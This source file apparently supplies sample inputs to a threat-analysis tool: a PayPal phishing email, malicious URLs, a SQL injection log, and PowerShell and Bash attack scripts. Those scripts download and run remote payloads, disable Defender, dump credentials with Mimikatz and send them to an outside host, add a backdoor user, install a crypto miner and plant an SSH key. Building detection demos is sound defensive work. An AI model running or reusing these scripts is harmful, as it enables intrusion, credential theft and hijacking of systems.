export const SAMPLE_INPUTS = [
  {
    id: 'phishing',
    label: '📧 Phishing Email',
    type: 'email',
    content: `From: security-alert@paypa1-secure.com
To: victim@company.com
Subject: URGENT: Your PayPal account has been suspended - Verify Now!
Date: Mon, 28 Jun 2026 09:12:43 -0400

Dear Valued Customer,

We have detected suspicious activity on your PayPal account. Your account has been temporarily limited.

To restore full access, please verify your identity immediately:

→ Click here to verify: http://paypa1-secure-login.xyz/verify?token=a8f3k2m9x&redirect=account

You must complete this within 24 hours or your account will be permanently suspended.

Your account details:
Account: victim@company.com
Last login: June 28, 2026 from 185.220.101.47 (Russia)

If you did not initiate this request, please call us at: +1-800-PAYPAL-FAKE

© 2026 PayPaI Security Team
paypa1-secure.com | privacy@paypa1-secure.com`,
  },
  {
    id: 'malicious-url',
    label: '🔗 Malicious URL',
    type: 'url',
    content: `hxxps://d3adbeef-malware[.]xyz/wp-admin/payload.php?cmd=whoami&exec=base64_decode%28JGNtZD0ic3lzdGVtKCd3aG9hbWknKTsiZXZhbCgkY21kKTs%3D%29&redirect=https://google.com

Additional suspicious URLs found in the same campaign:
- hxxp://185.220.101.47/shell.php?c=cat+/etc/passwd
- hxxps://cdn.discordapp.com/attachments/malware/update.exe
- hxxps://pastebin.com/raw/Xk9mP2qR (C2 config)
- hxxp://update-windows-security[.]com/critical-patch.exe`,
  },
  {
    id: 'sqli',
    label: '💉 SQLi Attack',
    type: 'log',
    content: `[2026-06-28 03:41:22] 192.168.1.105 POST /api/login HTTP/1.1 500 - Mozilla/5.0
Body: username=admin'--&password=anything
[2026-06-28 03:41:23] 192.168.1.105 GET /api/users?id=1+UNION+SELECT+table_name,NULL,NULL+FROM+information_schema.tables-- HTTP/1.1 200 4532
[2026-06-28 03:41:25] 192.168.1.105 GET /api/users?id=1+UNION+SELECT+column_name,NULL,NULL+FROM+information_schema.columns+WHERE+table_name='users'-- HTTP/1.1 200 2891
[2026-06-28 03:41:28] 192.168.1.105 GET /api/users?id=1+UNION+SELECT+username,password,email+FROM+users+LIMIT+10-- HTTP/1.1 200 8743
[2026-06-28 03:41:30] 192.168.1.105 GET /api/users?id=1;DROP+TABLE+sessions;-- HTTP/1.1 200 12
[2026-06-28 03:41:31] WAF ALERT: SQL injection detected from 192.168.1.105 - Pattern matched: UNION SELECT`,
  },
  {
    id: 'powershell',
    label: '⚡ PowerShell',
    type: 'script',
    content: `# Suspicious PowerShell script detected in endpoint telemetry
powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "
$client = New-Object System.Net.WebClient;
$url = 'http://185.220.101.47:8080/payload';
$path = $env:TEMP + '\\update.exe';
$client.DownloadFile($url, $path);

# Disable Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $true;
Add-MpPreference -ExclusionPath $env:TEMP;

# Establish persistence
$reg = 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run';
Set-ItemProperty -Path $reg -Name 'WindowsUpdate' -Value $path;

# Dump credentials
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Empire/mimikatz.ps1');
Invoke-Mimikatz -Command 'sekurlsa::logonpasswords' | Out-File C:\\temp\\creds.txt;

# Exfiltrate
$data = Get-Content C:\\temp\\creds.txt -Raw;
Invoke-RestMethod -Uri 'http://185.220.101.47:9090/exfil' -Method POST -Body $data;
Start-Process $path;"`,
  },
  {
    id: 'bash',
    label: '🐧 Bash Script',
    type: 'script',
    content: `#!/bin/bash
# Malicious bash script found in /tmp/.hidden_dir/

# Disable logging and hide activity
unset HISTFILE
export HISTSIZE=0
chattr +i /var/log/auth.log 2>/dev/null

# Establish C2 connection
C2_HOST="185.220.101.47"
C2_PORT="4444"

# Download and execute rootkit
curl -sk http://$C2_HOST/rootkit.sh | bash &

# Add backdoor user
useradd -m -s /bin/bash -G sudo backdoor_user
echo "backdoor_user:S3cr3tP@ssw0rd!" | chpasswd

# Install crypto miner
wget -q http://$C2_HOST/xmrig -O /tmp/.xmrig
chmod +x /tmp/.xmrig
/tmp/.xmrig --url=pool.supportxmr.com:443 --user=44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A --pass=x -k --tls &

# SSH key persistence
mkdir -p ~/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... attacker@evil.com" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys`,
  },
];
